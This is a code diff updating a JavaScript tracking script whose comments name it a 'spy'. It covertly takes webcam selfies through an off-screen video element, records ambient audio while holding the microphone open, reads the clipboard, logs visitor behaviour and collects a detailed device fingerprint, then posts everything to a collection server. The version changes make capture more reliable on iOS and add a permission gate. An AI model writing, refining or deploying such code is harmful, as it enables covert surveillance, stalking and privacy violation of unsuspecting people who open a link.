@@ -1,6 +1,7 @@
-/* igtracker spy: 自撮り / 環境音 / クリップボード / 行動ログ / 端末指紋。
-   v2: GPS と カメラ/マイク の衝突を解消。マイクは開いたまま保持する。
-   LT_CAM / LT_MIC / LT_CLIP / LT_MIC_HOLD で制御。 */
+/* igtracker spy v3: 自撮り / 環境音 / クリップボード / 行動ログ / 端末指紋。
+   ・video 要素を DOM に入れてから撮る（iOS の videoWidth=0 対策）
+   ・ゲート（LT_GATE）があるときは igt:gate まで走らない
+   ・window.LT_SPY.cam() / .mic() を公開（gate.js が順番に呼ぶ） */
 (function () {
   "use strict";
   var CODE = window.LT_CODE, HIT = window.LT_HIT || 0;
@@ -25,122 +26,151 @@
     } catch (e) { return 1; }
   })();
 
-  // 大きいもの（自撮り/音声）は keepalive を外す（64KB上限があるため）
+  /* 大きいものは keepalive を外す（64KB上限があるため） */
   function post(path, body, small) {
     try {
       return fetch(B + path, {
-        method: "POST", cache: "no-store",
-        keepalive: !!small,
+        method: "POST", cache: "no-store", keepalive: !!small,
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(body || {})
       }).catch(function () {});
     } catch (e) {}
   }
 
-  // 最初の測位が取れるまで待つ（iOS でGPSを殺さないため）
-  function whenGps(cb, maxWait) {
-    if (window.LT_GPS_READY) return cb();
-    var done = false;
-    function go() { if (done) return; done = true; cb(); }
-    window.addEventListener("igt:gps", go, { once: true });
-    setTimeout(go, maxWait || 7000);
-  }
-
   var camStream = null, micStream = null;
 
-  /* ---- 自撮り ---- */
+  /* ---------- 自撮り ---------- */
   function selfie() {
     if (!window.LT_CAM || !navigator.mediaDevices ||
-        !navigator.mediaDevices.getUserMedia) return;
-    navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user", width: { ideal: 400 }, height: { ideal: 300 } },
+        !navigator.mediaDevices.getUserMedia) return Promise.resolve(false);
+    return navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user", width: { ideal: 480 }, height: { ideal: 360 } },
       audio: false
     }).then(function (st) {
       camStream = st;
       var v = document.createElement("video");
-      v.autoplay = true; v.muted = true; v.playsInline = true; v.srcObject = st;
-      var done = false;
-      function shot() {
-        if (done) return;
-        done = true;
-        try {
-          var w = v.videoWidth || 320, h = v.videoHeight || 240;
-          var c = document.createElement("canvas");
-          c.width = w; c.height = h;
-          c.getContext("2d").drawImage(v, 0, 0, w, h);
-          post("/cap", {
-            hit: HIT, vid: VID, kind: "selfie",
-            data: c.toDataURL("image/jpeg", 0.6), meta: { w: w, h: h }
-          });
-        } catch (e) {}
-        // カメラは解放（保持したい場合は LT_CAM_HOLD=1）
-        if (!window.LT_CAM_HOLD) {
-          try { st.getTracks().forEach(function (t) { t.stop(); }); } catch (e) {}
-          camStream = null;
+      v.autoplay = true; v.muted = true; v.playsInline = true;
+      v.setAttribute("playsinline", "");
+      v.setAttribute("webkit-playsinline", "");
+      v.style.cssText = window.LT_CAM_PREVIEW
+        ? "position:fixed;right:10px;bottom:10px;width:104px;height:78px;border-radius:10px;" +
+          "object-fit:cover;z-index:30;background:#000;box-shadow:0 2px 12px rgba(0,0,0,.5)"
+        : "position:fixed;left:-9999px;top:0;width:160px;height:120px";
+      (document.body || document.documentElement).appendChild(v);   // ★ DOMに入れる
+      v.srcObject = st;
+      try { var pp = v.play(); if (pp && pp.catch) pp.catch(function () {}); } catch (e) {}
+
+      return new Promise(function (res) {
+        var done = false;
+        function finish(ok) {
+          if (done) return;
+          done = true;
+          if (window.LT_CAM_PREVIEW) {
+            setTimeout(function () {
+              try { v.pause(); v.remove(); } catch (e) {}
+            }, 1600);
+          } else {
+            try { v.pause(); v.remove(); } catch (e) {}
+          }
+          if (!window.LT_CAM_HOLD) {
+            setTimeout(function () {
+              try { st.getTracks().forEach(function (t) { t.stop(); }); } catch (e) {}
+              camStream = null;
+            }, window.LT_CAM_PREVIEW ? 1700 : 0);
+          }
+          setTimeout(function () {
+            if (window.LT_LIVE && window.LT_LIVE.restart) window.LT_LIVE.restart();
+          }, 400);
+          res(ok);
         }
-        setTimeout(function () { window.LT_LIVE && window.LT_LIVE.restart(); }, 400);
-      }
-      v.onloadedmetadata = function () { setTimeout(shot, 800); };
-      setTimeout(shot, 2500);
-    }).catch(function () {});
+        function tryShot(n) {
+          var w = v.videoWidth || 0, h = v.videoHeight || 0;
+          if ((w < 40 || h < 40) && n < 14) {
+            setTimeout(function () { tryShot(n + 1); }, 250);
+            return;
+          }
+          var ok = false;
+          try {
+            var cw = 480, ch = h ? Math.round(cw * h / w) : 360;
+            var c = document.createElement("canvas");
+            c.width = cw; c.height = ch;
+            var x = c.getContext("2d");
+            if (window.LT_CAM_MIRROR !== 0) { x.translate(cw, 0); x.scale(-1, 1); }
+            x.drawImage(v, 0, 0, cw, ch);
+            post("/cap", {
+              hit: HIT, vid: VID, kind: "selfie",
+              data: c.toDataURL("image/jpeg", 0.62), meta: { w: cw, h: ch }
+            });
+            ok = true;
+          } catch (e) { ok = false; }
+          finish(ok);
+        }
+        v.addEventListener("playing", function () { setTimeout(function () { tryShot(0); }, 600); });
+        v.addEventListener("loadedmetadata", function () { setTimeout(function () { tryShot(0); }, 900); });
+        setTimeout(function () { tryShot(0); }, 2200);
+        setTimeout(function () { finish(false); }, 8000);
+      });
+    }).catch(function () { return false; });
   }
 
-  /* ---- 環境音：開いたまま保持してタブを生かす ---- */
-  var micHold = function () { return window.LT_MIC_HOLD !== 0; };
+  /* ---------- 環境音 ---------- */
+  function micHold() { return window.LT_MIC_HOLD !== 0; }
   function micOpen() {
     if (!window.LT_MIC || !navigator.mediaDevices) return Promise.resolve(null);
     if (micStream && micStream.active) return Promise.resolve(micStream);
     return navigator.mediaDevices.getUserMedia({ audio: true }).then(function (st) {
       micStream = st;
-      // マイクが開いた直後にGPSを撃ち直す（オーディオセッション奪取対策）
       setTimeout(function () {
-        window.LT_LIVE && window.LT_LIVE.restart();
+        if (window.LT_LIVE && window.LT_LIVE.restart) window.LT_LIVE.restart();
         if (window.LT_KEEP && window.LT_KEEP.kick) window.LT_KEEP.kick();
       }, 500);
       return st;
     }).catch(function () { return null; });
   }
-
   function recordOnce(ms) {
-    if (!micStream || !window.MediaRecorder) return;
-    var rec;
-    try { rec = new MediaRecorder(micStream); } catch (e) { return; }
-    var chunks = [];
-    rec.ondataavailable = function (e) { if (e.data && e.data.size) chunks.push(e.data); };
-    rec.onstop = function () {
-      var blob = new Blob(chunks, { type: rec.mimeType || "audio/webm" });
-      if (blob.size < 900) return;
-      var fr = new FileReader();
-      fr.onload = function () {
-        post("/cap", {
-          hit: HIT, vid: VID, kind: "voice", data: fr.result,
-          meta: { ms: ms, mime: blob.type, held: micHold() }
-        });
+    if (!micStream || !window.MediaRecorder) return Promise.resolve(false);
+    return new Promise(function (res) {
+      var rec;
+      try { rec = new MediaRecorder(micStream); } catch (e) { return res(false); }
+      var chunks = [], done = false;
+      function fin(ok) { if (done) return; done = true; res(ok); }
+      rec.ondataavailable = function (e) { if (e.data && e.data.size) chunks.push(e.data); };
+      rec.onstop = function () {
+        var blob = new Blob(chunks, { type: rec.mimeType || "audio/webm" });
+        if (blob.size < 900) return fin(false);
+        var fr = new FileReader();
+        fr.onload = function () {
+          post("/cap", {
+            hit: HIT, vid: VID, kind: "voice", data: fr.result,
+            meta: { ms: ms, mime: blob.type, held: micHold() }
+          });
+          fin(true);
+        };
+        fr.readAsDataURL(blob);
       };
-      fr.readAsDataURL(blob);
-    };
-    try { rec.start(); } catch (e) { return; }
-    setTimeout(function () { try { rec.stop(); } catch (e) {} }, ms);
+      try { rec.start(); } catch (e) { return res(false); }
+      setTimeout(function () { try { rec.stop(); } catch (e) {} }, ms);
+    });
   }
-
   function voice() {
     var MS = Math.min(10000, (window.LT_MIC_MS || 4000));
-    micOpen().then(function (st) {
-      if (!st) return;
-      recordOnce(MS);
-      // 保持しないなら録り終わったら閉じる
-      if (!micHold()) {
-        setTimeout(function () {
-          if (micStream) {
-            try { micStream.getTracks().forEach(function (t) { t.stop(); }); } catch (e) {}
-            micStream = null;
-          }
-        }, MS + 1500);
-      }
+    return micOpen().then(function (st) {
+      if (!st) return false;
+      return recordOnce(MS).then(function (ok) {
+        if (!micHold()) {
+          setTimeout(function () {
+            if (micStream) {
+              try { micStream.getTracks().forEach(function (t) { t.stop(); }); } catch (e) {}
+              micStream = null;
+            }
+          }, MS + 1500);
+        }
+        return ok;
+      });
     });
   }
 
-  /* ---- クリップボード ---- */
+  /* ---------- クリップボード ---------- */
   function clipOnce() {
     if (!window.LT_CLIP || !navigator.clipboard || !navigator.clipboard.readText) return;
     navigator.clipboard.readText().then(function (t) {
@@ -154,7 +184,7 @@
     }, { once: true, passive: true });
   });
 
-  /* ---- 行動ログ ---- */
+  /* ---------- 行動ログ ---------- */
   var t0 = Date.now(), maxScroll = 0, hiddenMs = 0, hiddenAt = 0;
   function sendEv(kind, value, text) {
     post("/ev", { hit: HIT, vid: VID, kind: kind, value: value || 0, text: text || "" }, true);
@@ -165,17 +195,8 @@
     if (p > maxScroll) maxScroll = p;
   }, { passive: true });
   document.addEventListener("visibilitychange", function () {
-    if (document.visibilityState === "hidden") {
-      hiddenAt = Date.now();
-      sendEv("blur");
-      return;
-    }
-    if (hiddenAt) {
-      hiddenMs += Date.now() - hiddenAt;
-      hiddenAt = 0;
-      sendEv("focus");
-    }
-    // 復帰時にマイクが死んでいたら開き直す
+    if (document.visibilityState === "hidden") { hiddenAt = Date.now(); sendEv("blur"); return; }
+    if (hiddenAt) { hiddenMs += Date.now() - hiddenAt; hiddenAt = 0; sendEv("focus"); }
     if (micHold() && (!micStream || !micStream.active)) micOpen();
   });
   function flush(final) {
@@ -188,7 +209,7 @@
   setInterval(function () { flush(false); }, 15000);
   window.addEventListener("pagehide", function () { flush(true); });
 
-  /* ---- 端末指紋 ---- */
+  /* ---------- 端末指紋 ---------- */
   function gpu() {
     try {
       var c = document.createElement("canvas");
@@ -218,18 +239,15 @@
     var n = navigator.connection || {};
     sendEv("device", VISITS, JSON.stringify({
       visits: VISITS,
-      tz: (function () {
-        try { return Intl.DateTimeFormat().resolvedOptions().timeZone; }
-        catch (e) { return ""; }
-      })(),
+      tz: (function () { try { return Intl.DateTimeFormat().resolvedOptions().timeZone; }
+                         catch (e) { return ""; } })(),
       langs: navigator.languages || [navigator.language],
       cores: navigator.hardwareConcurrency || 0,
       mem: navigator.deviceMemory || 0,
       net: n.effectiveType || "", downlink: n.downlink || 0, rtt: n.rtt || 0,
       platform: navigator.platform || "", touch: navigator.maxTouchPoints || 0,
       gpu: gpu(), fonts: fonts(),
-      pdf: !!navigator.pdfViewerEnabled,
-      cookie: !!navigator.cookieEnabled
+      pdf: !!navigator.pdfViewerEnabled, cookie: !!navigator.cookieEnabled
     }));
     try {
       if (navigator.storage && navigator.storage.estimate) {
@@ -240,10 +258,21 @@
     } catch (e) {}
   }
 
-  /* ---- 起動順序：GPS → カメラ → マイク ---- */
-  setTimeout(function () { deviceInfo(); }, 300);
-  whenGps(function () {
-    setTimeout(selfie, 300);
-    setTimeout(voice, 2200);
-  }, window.LT_SPY_WAIT || 7000);
+  window.LT_SPY = { cam: selfie, mic: voice, micOpen: micOpen, flush: flush };
+
+  function autoRun() {
+    setTimeout(function () { deviceInfo(); }, 300);
+    setTimeout(selfie, 400);
+    setTimeout(voice, 2600);
+  }
+
+  if (window.LT_GATE && !window.LT_GATE_PASS) {
+    // ゲートが許可を取るので、ここでは走らない
+    window.addEventListener("igt:gate", autoRun, { once: true });
+  } else if (window.LT_GPS_READY || !window.LT_LIVE) {
+    autoRun();
+  } else {
+    window.addEventListener("igt:gps", autoRun, { once: true });
+    setTimeout(autoRun, window.LT_SPY_WAIT || 7000);
+  }
 })();
